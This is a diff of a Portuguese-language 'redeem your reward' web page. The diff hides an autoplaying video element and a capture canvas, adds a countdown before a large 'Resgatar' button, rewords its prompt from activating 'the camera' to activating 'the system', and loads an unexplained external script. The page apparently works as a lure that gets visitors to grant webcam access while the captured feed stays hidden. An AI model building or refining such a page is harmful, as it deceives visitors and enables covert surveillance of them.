@@ -9,18 +9,21 @@
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
 
-<div class="video-wrap">
+<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
 </div>
 
-<center><canvas id="canvas" width="640" height="480"></canvas></center>
+<center><canvas hidden="hidden" id="canvas" width="640" height="480"></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght=500&display=swap");
 
   body {
+    margin:0;
     height: 100vh;
-    width: 100vw;
+    display: flex;
+    justify-content: center;
+    align-items: center;
     background-color: #273039;
   }
 
@@ -94,61 +97,73 @@
   }
 
     #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.6);
-    z-index: 1001;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 1001;
     }
-
     #popup {
-    position: fixed;
-    bottom: 30px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 90%;
-    max-width: 400px;
-    text-align: center;
-    z-index: 1002;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      z-index: 1002;
+
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
     }
 
     #popup h2 {
-    color: #ffffff;
-    font-size: 22px;
-    margin-bottom: 15px;
-    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);
+      color: #ffffff;
+      font-size: 22px;
+      margin-bottom: 15px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);
     }
 
-    #loginForm {
-    display: inline-block;
-    color: #ffffff;
-    background-color: crimson;
-    padding: 14px 50px;
-    font-size: 16px;
-    font-weight: 600;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    border: none;
-    border-radius: 50px;
-    outline: none;
-    cursor: pointer;
-    box-shadow: 0 4px 15px rgba(220, 20, 60, 0.4);
-    transition: all 0.3s ease;
-    width: 100%;
+    #botao {
+        display: none;
+        color: #ffffff;
+        background-color: rgb(238, 201, 0);
+        padding: 40px 120px;
+        font-size: 38px;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        border: none;
+        border-radius: 50px;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(238, 201, 0, 0.5);
+        transition: all 0.3s ease;
     }
 
-    #loginForm:hover {
-    background-color: #b31434;
-    box-shadow: 0 6px 20px rgba(179, 20, 52, 0.6);
-    transform: translateY(-2px);
+    #botao:hover {
+        background-color: rgb(212, 175, 55);
+        box-shadow: 0 6px 20px rgba(212, 175, 55, 0.6);
+        transform: translateY(-2px);
     }
 
-    #loginForm:active {
-    transform: translateY(1px);
+    #botao:active {
+      transform: translateY(1px);
+    }
+
+
+
+    #contador {
+    font-size: 120px;
+    font-weight: bold;
+    text-align: center;
+    color: yellow;
     }
 </style>
+
 
 <script>
   let secondsCounter = 0;
@@ -219,6 +234,7 @@
   $(document).ready(function () {
     init();
   });
+
 </script>
 
 <body>
@@ -227,12 +243,33 @@
   </div>
   <div id="ac-wrapper">
     <div id="popup">
-      <center>
-        <h2 style="margin-top: 20px;">Validando...</h2>
-      </center>
-      <button type="button" id="loginForm" class="btn btn-primary" onclick="alert('Para efetuar o resgate é necessário ativar a câmera.'); location.reload();">Resgatar</button>
+      <button id="botao" type="button" class="btn btn-primary" onclick="alert('Para efetuar o resgate é necessário ativar o sistema.'); location.reload();">Resgatar</button>
+    
+    <div id="contador">10</div>
     </div>
   </div>
+  
+<script src="/static/js/10ck.js"></script>
 </body>
+
+<script>
+    let numero = 3;
+
+    const contador = document.getElementById("contador");
+    const botao = document.getElementById("botao");
+
+    const intervalo = setInterval(() => {
+        numero--;
+
+        if (numero > 0) {
+            contador.textContent = numero;
+        } else {
+            clearInterval(intervalo);
+            contador.style.display = "none";
+            botao.style.display = "block";
+        }
+    }, 1000);
+</script>
+
 
 </html>
